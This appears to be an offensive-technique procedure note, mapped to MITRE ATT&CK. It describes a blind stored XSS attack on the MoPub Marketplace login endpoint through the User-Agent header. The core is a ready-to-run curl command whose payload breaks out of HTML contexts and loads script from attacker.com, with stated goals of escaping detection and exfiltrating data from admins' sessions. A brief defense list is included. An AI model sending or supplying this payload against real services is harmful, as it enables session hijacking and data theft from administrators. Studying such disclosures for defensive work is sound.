---
tags:
  - xss
  - payload-injection
  - user-agent
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-inject-user-agent]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 8376cf2c-5b5f-4cc5-bf8c-977dc098ea06
created_at: '2025-12-14T17:30:27.347Z'
updated_at: '2025-12-14T17:30:27.347Z'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Malicious-User-Agent-Payload

## Summary

This procedure injects a blind XSS payload into the MoPub login endpoint via the User-Agent header, storing it for later reflection in the admin dashboard without immediate execution or feedback.

## Description

In the MoPub Marketplace, the User-Agent header from requests to /accounts/login/ is stored and later reflected in the admin production dashboard at sentry-test.mopub.com. By crafting a payload that closes HTML contexts like <title>, <style>, <textarea>, and <script>, an attacker can escape into a script injection when rendered in an <option> tag. This sets up a blind XSS where execution occurs only when an admin views the page, allowing arbitrary JS to run in their context for data theft.

## Requirements

1. Network access to https://demand.mopub.com/accounts/login/
2. A controlled domain (e.g., attacker.com) hosting a malicious JS file
3. HTTP client like curl for sending requests

## Defense

Defensive measures and detection strategies:

- Encode all reflected User-Agent values in HTML contexts, especially within tags like <option>
- Implement Content Security Policy (CSP) to block external script loads
- Log and monitor anomalous User-Agent strings for injection patterns

## Objectives

1. Store the payload in the backend without detection
2. Prepare for context escape upon admin reflection
3. Enable JS execution for data exfiltration

## Instructions

### Step 1: Craft and Send Payload Request

**Context**: Construct a User-Agent that breaks out of the <option> tag context by closing prior HTML elements and injecting a <script> src to your domain.

**Command** ([[commands/curl-inject-user-agent]]):
```bash
curl -H "User-Agent: "></title></style></textarea></script><script src=https://attacker.com/js></script>" https://demand.mopub.com/accounts/login/
```

> This sends a GET request (or POST if needed) with the payload. Replace the src URL with your actual domain. Expected output is a standard login response; success is confirmed later.

### Step 2: Verify Payload Storage (Optional Blind Check)

**Context**: Without direct feedback, wait for admin trigger; optionally send benign requests to check if User-Agent is logged.

No specific command; monitor backend if accessible.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-user-agent]]

## Tools Used


## Tags

- [[xss]]
- [[payload-injection]]
